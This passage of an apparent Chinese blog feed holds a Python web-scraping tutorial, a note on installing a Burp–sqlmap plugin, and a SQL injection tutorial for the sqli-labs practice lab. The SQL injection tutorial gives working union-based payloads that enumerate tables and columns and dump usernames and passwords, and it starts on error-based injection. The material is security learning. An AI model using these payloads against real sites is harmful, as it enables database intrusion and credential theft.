class="keyword">else</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;kw&#x27;</span>:word,</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(<span class="string">&quot;https://fanyi.baidu.com/sug&quot;</span>,data)</span><br><span class="line">        <span class="comment"># &#123;&quot;errno&quot;:997,&quot;errmsg&quot;:&quot;\u672a\u77e5\u9519\u8bef&quot;,&quot;logid&quot;:2920036812,&quot;query&quot;:&quot;\u72d7&quot;,&quot;from&quot;:&quot;zh&quot;,&quot;to&quot;:&quot;en&quot;,&quot;error&quot;:997&#125;</span></span><br><span class="line">        <span class="comment"># json</span></span><br><span class="line">        json_data = resp.json()</span><br><span class="line">        <span class="built_in">print</span>(json_data) <span class="comment">#获取数据格式</span></span><br><span class="line">        data_list = json_data[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span>  data_list:</span><br><span class="line">            <span class="built_in">print</span>(data[<span class="string">&#x27;k&#x27;</span>] + <span class="string">&quot;： &quot;</span> + data[<span class="string">&#x27;v&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240315223118283.png" alt="image-20240315223118283"></p><h2 id="爬美女图片"><a href="#爬美女图片" class="headerlink" title="爬美女图片"></a>爬美女图片</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;https://cdn.seovx.com/?mom=302&#x27;</span><br><span class="line">resp = requests.get(url=url)</span><br><span class="line">#print(resp.text)</span><br><span class="line">with open(&#x27;./tu.png&#x27;, mode=&#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(resp.content)</span><br><span class="line">#print(&#x27;保存成功&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240315231837221.png" alt="image-20240315231837221"></p><h2 id="爬视频"><a href="#爬视频" class="headerlink" title="爬视频"></a>爬视频</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url=<span class="string">&#x27;https://api.linhun.vip/api/Littlesistervideo?type=json&amp;apiKey=05961127134-89951501711-d6a79dfe896&#x27;</span></span><br><span class="line">resp = requests.get(url=url)</span><br><span class="line"><span class="built_in">print</span>(resp.json())</span><br><span class="line">url2 = resp.json()[<span class="string">&#x27;video&#x27;</span>]</span><br><span class="line"><span class="comment">#print(url2)</span></span><br><span class="line">content = requests.get(url=url2).content</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;girl.mp4&#x27;</span>, mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure><p>要注意，里面有个apiKey是需要手动获取的，是为了防止恶意使用，然后这种别的媒体的形式，需要获取字节码，然后保存到相应格式的文件中。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p><strong>1.<strong><strong>访问</strong></strong><a href="https://news.sina.com.cn/roll/#pageid=153&lid=2509&k=&num=50&page=2">新浪微博网页</a></strong></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img"></p><p>查看网页源代码，可以发现这些新闻链接是通过js生成的，所以我们需要查看js页面</p><p>*<em>2.<strong><strong>分析</strong></strong>js</em>*<strong>页面</strong></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" alt="img"></p><p>找到get请求返回的页面，查看信息，可以发现链接和标题都在里面，所以我们需要提取的页面是这个</p><p>*<em>3.<strong><strong>提取</strong></strong>js</em>*<strong>页面</strong></p><p>首先很明显是一个json格式，需要切片，转换格式，然后根据实际情况提取信息即可</p><p>  import json   import requests   url &#x3D; “<a href="https://feed.mix.sina.com.cn/api/roll/get?pageid=153&amp;lid=2509&amp;k=&amp;num=50&amp;page=2&amp;r=0.3009011709274978&amp;callback=jQuery111202890527579006905_1716863975570&amp;_=1716863975571&quot;">https://feed.mix.sina.com.cn/api/roll/get?pageid=153&amp;lid=2509&amp;k=&amp;num=50&amp;page=2&amp;r=0.3009011709274978&amp;callback=jQuery111202890527579006905_1716863975570&amp;_=1716863975571&quot;</a> <em>#</em> *替换为实际的页面链接 *  response &#x3D;  requests.get(url)   reply &#x3D; json.loads(response.text[46:-14])   <em>#print(len(reply[‘result’][‘data’]))</em>   for i in reply[‘result’][‘data’]:     *#print(i) *    print(i[“url”])     print(i[“title”])     </p><p>这里就不每个页面都提取了，如果需要提取，可以改成以下格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for page_num in range(1, num):   url = &quot;https://feed.mix.sina.com.cn/api/roll/get?pageid=153&amp;lid=2509&amp;k=&amp;num=50&amp;page=&#123;&#125;&amp;r=0.3009011709274978&amp;callback=jQuery111202890527579006905_1716863975570&amp;_=1716863975571&quot;.format(page_num)   print(url)</span><br></pre></td></tr></table></figure><p>可以看看title和相应网页里面的标题是否一致</p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" alt="img"></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg" alt="img"></p><p>可以看到标题和链接都是对应的，下面就是进入相应的网页提取文本和配图了</p><p>**4.**<strong>提取正文和配图</strong></p><p>进入目标页面，查看网页源代码，找到网页确定正文的逻辑</p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg" alt="img"></p><p>可以看到正文都是在id为artibody的div下，且每段文字都由p标签包裹，所以我们可以通过确定这两个元素来获取正文内容，需要注意的是当div为null时，是没有find_all方法的，我们需要先判断div元素是否存在。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*#* *判断* *&lt;div&gt;* *元素是否存在 *  if div_element is not None:   p_tags = div_element.find_all(&quot;p&quot;)   *#* *遍历每个* *&lt;p&gt;* *标签，获取内容 *   content = &quot;\n&quot;.join([p.text for p in p_tags])   *#* *提取配图链接 *   img_tags = div_element.find_all(&quot;img&quot;)   image_urls = [f&quot;https:&#123;img[&#x27;src&#x27;]&#125;&quot; for img in img_tags]   *#* *创建新闻文件夹 *   news_dir = os.path.join(save_dir, title)   os.makedirs(news_dir, exist_ok=True)   *#* *保存新闻标题和正文到文件 *   with open(os.path.join(news_dir, &quot;content.txt&quot;), &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:     f.write(content)</span><br></pre></td></tr></table></figure><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg" alt="img"></p><p>可以看到获取到了相应的正文内容，下面就是获取img了，同样的原理，获取相应的img标签即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*#* *提取配图链接 *  img_tags = div_element.find_all(&quot;img&quot;)  for img_tag in img_tags:  image_url=&quot;https:&quot; +img_tag.get(&quot;src&quot;)  print(image_url)  *#* *下载配图 *  image_response = requests.get(image_url)  image_name = os.path.basename(image_url)  image_path = os.path.join(&quot;news_data&quot;, image_name)  with open(image_path, &quot;wb&quot;) as f:   f.write(image_response.content)</span><br></pre></td></tr></table></figure><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg" alt="img"></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg" alt="img"></p><p>**5.**<strong>保存成对应的文件夹，并做异常处理</strong></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg" alt="img"></p><p>在img处添加try：catch</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*#* *下载配图并保存到文件 *  for i, image_url in enumerate(image_urls):   try:     response = requests.get(image_url)     image_name = f&quot;image_&#123;i+1&#125;.jpg&quot;     image_path = os.path.join(news_dir, image_name)     with open(image_path, &quot;wb&quot;) as f:       f.write(response.content)   except requests.exceptions.InvalidURL:     print(f&quot;Invalid URL: &#123;image_url&#125;&quot;)</span><br></pre></td></tr></table></figure><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg" alt="img"></p><p><img src="file:///C:/Users/yxz/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg" alt="img"></p><p>完整代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义保存路径</span></span><br><span class="line">save_dir = <span class="string">&quot;news_data&quot;</span></span><br><span class="line">os.makedirs(save_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://feed.mix.sina.com.cn/api/roll/get?pageid=153&amp;lid=2509&amp;k=&amp;num=50&amp;page=2&amp;r=0.3009011709274978&amp;callback=jQuery111202890527579006905_1716863975570&amp;_=1716863975571&quot;</span>  <span class="comment"># 替换为实际的页面链接</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line">reply = json.loads(response.text[<span class="number">46</span>:-<span class="number">14</span>])</span><br><span class="line">links = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reply[<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">    links.append(i[<span class="string">&quot;url&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">    response = requests.get(link)</span><br><span class="line">    response.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">    news_soup = BeautifulSoup(response.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取新闻标题</span></span><br><span class="line">    title = news_soup.find(<span class="string">&quot;h1&quot;</span>).text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取新闻正文</span></span><br><span class="line">    div_element = news_soup.find(<span class="string">&quot;div&quot;</span>, <span class="built_in">id</span>=<span class="string">&quot;artibody&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断 &lt;div&gt; 元素是否存在</span></span><br><span class="line">    <span class="keyword">if</span> div_element <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        p_tags = div_element.find_all(<span class="string">&quot;p&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历每个 &lt;p&gt; 标签，获取内容</span></span><br><span class="line">        content = <span class="string">&quot;\n&quot;</span>.join([p.text <span class="keyword">for</span> p <span class="keyword">in</span> p_tags])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取配图链接</span></span><br><span class="line">        img_tags = div_element.find_all(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">        image_urls = [<span class="string">f&quot;https:<span class="subst">&#123;img[<span class="string">&#x27;src&#x27;</span>]&#125;</span>&quot;</span> <span class="keyword">for</span> img <span class="keyword">in</span> img_tags]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建新闻文件夹</span></span><br><span class="line">        news_dir = os.path.join(save_dir, title)</span><br><span class="line">        os.makedirs(news_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保存新闻标题和正文到文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(news_dir, <span class="string">&quot;content.txt&quot;</span>), <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 下载配图并保存到文件</span></span><br><span class="line">        <span class="keyword">for</span> i, image_url <span class="keyword">in</span> <span class="built_in">enumerate</span>(image_urls):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.get(image_url)</span><br><span class="line">                image_name = <span class="string">f&quot;image_<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>.jpg&quot;</span></span><br><span class="line">                image_path = os.path.join(news_dir, image_name)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(image_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(response.content)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.InvalidURL:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Invalid URL: <span class="subst">&#123;image_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Saved news: <span class="subst">&#123;title&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;No content found for: <span class="subst">&#123;title&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Xpath解析"><a href="#Xpath解析" class="headerlink" title="Xpath解析"></a>Xpath解析</h2><p>xpath各种用法节点: 每个HTML标签叫节点最外层节点:</p><p> 根节点内层节点: 子节点父子节点: &lt;爹&gt;&lt;子&gt;&lt;&#x2F;子&gt;&lt;&#x2F;梦&gt;</p><p>xpath提取到的内容不论多少，都会返回列表</p><p><a href="https://desk.zol.com.cn/%E5%A3%81%E7%BA%B8%E7%BD%91%E7%AB%99https://desk.zol.com.cn/meinv/">https://desk.zol.com.cn/壁纸网站https://desk.zol.com.cn/meinv/</a></p><h1 id="企查查供应商爬取"><a href="#企查查供应商爬取" class="headerlink" title="企查查供应商爬取"></a>企查查供应商爬取</h1><p>首先，因为需要收集供应商信息，除了寻标宝等，在企查查中也有供应商的图，但数量比较大，且查看源码发现是动态生成的，下面开始测试，以某公司为例</p><p>第一步：打开源代码寻找相关js文件</p><p>右键源代码&#x2F;来源里的文件，全局搜索关键词：供应商</p><p><img src="/../image/image-20240812153029185.png" alt="image-20240812153029185"></p><p><img src="/../image/image-20240812153219519.png" alt="image-20240812153219519"></p><p>第二部：确定文件数据格式，保存为json文件</p><p><img src="/../image/image-20240812153724884.png" alt="image-20240812153724884"></p><p>第三步：判断层级，确定长度是否与图一致，图里是500，然后就是根据长度保存</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;gys.json&quot;</span>, <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line"><span class="built_in">print</span>(json.dumps(data, indent=<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data[<span class="string">&quot;Result&quot;</span>][<span class="string">&quot;Children&quot;</span>][<span class="number">5</span>][<span class="string">&quot;Children&quot;</span>]))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;gys.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        f.write(data[<span class="string">&quot;Result&quot;</span>][<span class="string">&quot;Children&quot;</span>][<span class="number">5</span>][<span class="string">&quot;Children&quot;</span>][i][<span class="string">&quot;Name&quot;</span>] + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>比较容易没什么问题</p><h1 id="并发编程"><a href="#并发编程" class="headerlink" title="并发编程"></a>并发编程</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">a1,a2,a3</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">t = threading.Thread(target=func, args=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line">t.start</span><br></pre></td></tr></table></figure><h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line">t = multiprocessing.Process(target=funcname,args=())</span><br><span class="line">t.start</span><br></pre></td></tr></table></figure><p>多进程要放在</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> name=<span class="string">&quot;__main__&quot;</span>: </span><br></pre></td></tr></table></figure><p>否则windows下会报错，因为linux时基于fork，win是spawn</p>]]></content>
      
      
      
        <tags>
            
            <tag> pthon </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burp+sqlmap</title>
      <link href="/2024/03/14/burp-sqlmap/"/>
      <url>/2024/03/14/burp-sqlmap/</url>
      
        <content type="html"><![CDATA[<h1 id="burp-sqlmap"><a href="#burp-sqlmap" class="headerlink" title="burp+sqlmap"></a>burp+sqlmap</h1><p>第一步：Extend-&gt;BApp store-&gt;SQLIpy Sqlmap Interation</p><p><img src="/../image/image-20240314185825308.png" alt="image-20240314185825308"></p><p>要先安装一下jython<a href="https://www.jython.org/download.html">https://www.jython.org/download.html</a></p><p><img src="/../image/image-20240314191141359.png" alt="image-20240314191141359"></p><p><img src="/../image/image-20240314191049446.png" alt="image-20240314191049446"></p><p>连接失败，去这个网站<a href="https://portswigger.net/bappstore/%E4%B8%8B%E8%BD%BD">https://portswigger.net/bappstore/下载</a></p><p><img src="/../image/image-20240314192650903.png" alt="image-20240314192650903"></p><p><img src="/../image/image-20240314192707918.png" alt="image-20240314192707918"></p><p>如果启动时会报错，可能时jyphon有问题，去重新下或换个版本就行</p>]]></content>
      
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql</title>
      <link href="/2024/03/02/sql/"/>
      <url>/2024/03/02/sql/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>1、查找注入点</p><p>2、判断是字符型还是数字型注入 </p><p>3、如果字符型，找到他的闭合方式</p><p>4、判断查询列数，group by 或 order by</p><p>5、查询回显位置 -1（id要是不存在的数据）</p><h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><ul><li><p>按照查询字段</p><ul><li>字符型:输入参数为整形</li><li>数字型:输入参数为字符型</li></ul></li><li><p>按照注入方法</p><ul><li>Union注入</li><li>报错注入</li><li>布尔注入</li><li>时间注入</li></ul></li></ul><h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><p>注入点就是可以实行注入的地方，通常是一个访问数据库的连接，如本页面的注入点input the ID</p><h3 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h3><p><img src="/../image/image-20240131141452662.png" alt="image-20240131141452662"></p><h2 id="如何判断是字符型还是数字型"><a href="#如何判断是字符型还是数字型" class="headerlink" title="如何判断是字符型还是数字型"></a>如何判断是字符型还是数字型</h2><p>实用and 1&#x3D;1 和and 1&#x3D;2来判断，数字型一般提交内容为数字，但数字不一定为数字型。</p><p>Less-1 提交and 1&#x3D;1和提交and 1&#x3D;2，如果是数字型，你1&#x3D;2就不会正常显示，是字符型则仍能正常显示，这里是字符型</p><p><img src="/../image/image-20240131142319694.png" alt="image-20240131142319694"></p><p>Less-2则是数字型了</p><p><img src="/../image/image-20240131142425527.png" alt="image-20240131142425527"></p><p>也可以直接用运算2-1如果显示的是2的数据则是字符型，注意+号会被认为是空格</p><p><img src="/../image/image-20240131142754670.png" alt="image-20240131142754670"></p><h2 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式"></a>闭合方式</h2><p>一个单引号-‘</p><p>两个单引号’’</p><p>一个单引号’+)</p><p>两个单引号’’+)</p><p>或双引号</p><p>其他</p><h3 id="如何判断闭合方式"><a href="#如何判断闭合方式" class="headerlink" title="如何判断闭合方式"></a>如何判断闭合方式</h3><p>例如Less-1输入?id&#x3D;1’‘’报错为 near ‘’1’’’’ LIMIT 0,1多一个’闭合符为‘’,还有一个–+ 可以把面的内容注释掉</p><p><img src="/../image/image-20240131151415891.png" alt="image-20240131151415891"></p><p>在Less-3中先输入一个’会报错，可以看到有个括号,</p><p><img src="/../image/image-20240131151501215.png" alt="image-20240131151501215"></p><p>这时候可以括号闭合，再注释后面的内容</p><h3 id="闭合的作用"><a href="#闭合的作用" class="headerlink" title="闭合的作用"></a>闭合的作用</h3><p><img src="/../image/image-20240131151703697.png" alt="image-20240131151703697"></p><h2 id="Union联合注入"><a href="#Union联合注入" class="headerlink" title="Union联合注入"></a>Union联合注入</h2><p>提交：?id&#x3D;1’ union select database () –+</p><p>需要注意列数，可以先group by + 数字判断列数</p><p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> group by 4–+到四就报错了，说明有3列，用二分法就好了，还可以order by + 数字</p><p><img src="/../image/image-20240131152330244.png" alt="image-20240131152330244"></p><p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> union select 1,2,3–+</p><p>列数要一致，但有时候不一定都显示，所以我们需要放在可以显示的列，phpmyadmin没用了。。</p><p>select * from users where id&#x3D;’1’ union select 1,2,3;</p><p><img src="/../image/image-20240131153436408.png" alt="image-20240131153436408"></p><p>但页面只显示第一行，所以可以把id设置成-1</p><p><img src="/../image/image-20240131153600297.png" alt="image-20240131153600297"></p><p><a href="http://localhost/sqli-labs/Less-1/?id=-1&#39;">http://localhost/sqli-labs/Less-1/?id=-1&#39;</a> union select 1,2,database()–+</p><p>所以可以将3换成database()就可以查到库名了</p><p><img src="/../image/image-20240131212132753.png" alt="image-20240131212132753"></p><p>2也可以用，但1不行，因为1没有回显位，version()可以用来显示版本</p><p><img src="/../image/image-20240131212742386.png" alt="image-20240131212742386"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,version(),databse() --+</span><br></pre></td></tr></table></figure><p>页面只能显示一个内容,第二句的内容是不显示的，可以把第- -的内容改为数据库不存在的数据，如id&#x3D;0。</p><p>?id&#x3D;1’ union select 1,2,database() –+</p><h3 id="关键数据库、数据表、数据列、group-concat作用"><a href="#关键数据库、数据表、数据列、group-concat作用" class="headerlink" title="关键数据库、数据表、数据列、group_concat作用"></a>关键数据库、数据表、数据列、group_concat作用</h3><ul><li>数据库：Information_schema（包含所有mysql数据库的简要信息）<ul><li>数据表：tables<ul><li>表名集合表</li></ul></li><li>数据表：columns<ul><li>列名集合表</li></ul></li></ul></li></ul><p>但waf对这个有防御，不怎么容易用上</p><h3 id="查找表名"><a href="#查找表名" class="headerlink" title="查找表名"></a>查找表名</h3><p>走到确定回显位的时候</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,table_name,3 from information_schema.tables --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240131214415498.png" alt="image-20240131214415498"></p><p>但里面数据这么多，这里只显示一个，所以需要限制条件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,table_name,3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240131214715798.png" alt="image-20240131214715798"></p><p>也可以直接用刚刚得到的数据库名，但函数更好用一些，有的防火墙不一定过滤函数</p><p>但表名还是只能显示一个，这是时候就要用到**group_concat()**把多个列名合在一起</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p>把table_name作为参数放到group_concat()函数就可以了</p><p><img src="/../image/image-20240131215006002.png" alt="image-20240131215006002"></p><h3 id="查找列名"><a href="#查找列名" class="headerlink" title="查找列名"></a>查找列名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,column_name,3 from information_schema.columns --+</span><br></pre></td></tr></table></figure><p>同样的思路，最终语句如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=databse() and table_namme=&#x27;你需要的那个表&#x27;--+</span><br></pre></td></tr></table></figure><p>我这里以user表为例子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240131221726938.png" alt="image-20240131221726938"></p><p>我们也可以在mysql里直接看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show columns from security.users;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240131222241062.png" alt="image-20240131222241062"></p><p>确实是这三个</p><h3 id="查找最终目标"><a href="#查找最终目标" class="headerlink" title="查找最终目标"></a>查找最终目标</h3><p>查找里面的内容，比如我们要获取user表里的username和password，一样的思路</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(username,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240131224502718.png" alt="image-20240131224502718"></p><p>聚在一起不好看，可以插入”~”区分数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(username,&#x27;~&#x27;,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240131224606034.png" alt="image-20240131224606034"></p><h3 id="数字型union注入"><a href="#数字型union注入" class="headerlink" title="数字型union注入"></a>数字型union注入</h3><h4 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h4><ol><li>确定数字型还是字符型</li><li>使用group by的二分法判断union语句中前一个查询的列数</li><li>优化语句，将id改为一个不存在的数字</li><li>使用select语句，查询靶机数据库库名</li><li>使用select语句，查询靶机所有表名</li><li>使用select语句，查询靶机所有列名</li><li>查询所有用户名密码</li></ol><h3 id="拿Less2练练手"><a href="#拿Less2练练手" class="headerlink" title="拿Less2练练手"></a>拿Less2练练手</h3><p>一样，判断注入点？id&#x3D;1有回显</p><p><img src="/../image/image-20240131225137471.png" alt="image-20240131225137471"></p><p>然后id&#x3D;2-1判断类型</p><p><img src="/../image/image-20240131225153111.png" alt="image-20240131225153111"></p><p>结果和id&#x3D;1一样，所以是数字型，就不加’了，在最后加个#号注释即可，或–+，查列数id&#x3D;1 order by 3 –+，和之前一样是三列</p><p><img src="/../image/image-20240131225347565.png" alt="image-20240131225347565"></p><p>判断回显位置,这里就不用1，2，3了,注意id要是-1或者0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,version(),database() --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240131225633817.png" alt="image-20240131225633817"></p><p>知道回显位置后，查表名（库名知道了）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables  where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240131225915149.png" alt="image-20240131225915149"></p><p>查到表名再查列名，因为回显得是name和password，那就查这个，试试user表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns  where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240131230226025.png" alt="image-20240131230226025"></p><p>结果一样的，没什么变化，再查具体信息,这里就不加~了，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(username,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240131230324541.png" alt="image-20240131230324541"></p><p>差不多就是这样</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><img src="/../image/image-20240131232843853.png" alt="image-20240131232843853"></p><p><img src="/../image/image-20240201151543752.png" alt="image-20240201151543752"></p><p>重要的是前三个，后面不怎么见到</p><h4 id="通过extractValue-报错注入"><a href="#通过extractValue-报错注入" class="headerlink" title="通过extractValue()报错注入"></a>通过extractValue()报错注入</h4><p><img src="/../image/image-20240201152540772.png" alt="image-20240201152540772"></p><p>这是数据库words中的一个表xml，里面有个doc字段为varchar(50),再插入两个xml代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into xml values(&#x27;&lt;book&gt;&lt;title&gt;A bad boy how to get agirlfriend&lt;/title&gt;&lt;author&gt;&lt;initial&gt;Love&lt;/initial&gt;&lt;surname&gt;benben&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;&#x27;);</span><br><span class="line">insert into xml values(&#x27;&lt;book&gt;&lt;title&gt;how to become a bad boy&lt;/title&gt;&lt;author&gt;&lt;initial&gt;hualong&lt;/initial&gt;&lt;surname&gt;Melton&lt;/surname&gt;</span><br><span class="line">&lt;/author&gt;</span><br><span class="line">&lt;/book&gt;&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201153602460.png" alt="image-20240201153602460"></p><p>下面事着查询一下作者是谁，extractValue有两个参数第一个是列名，后一个是路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractValue(doc,&#x27;/book/author/surname&#x27;) from xml;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201154031658.png" alt="image-20240201154031658"></p><p>查书名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractValue(doc,&#x27;/book/title&#x27;) from xml;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240201154118824.png" 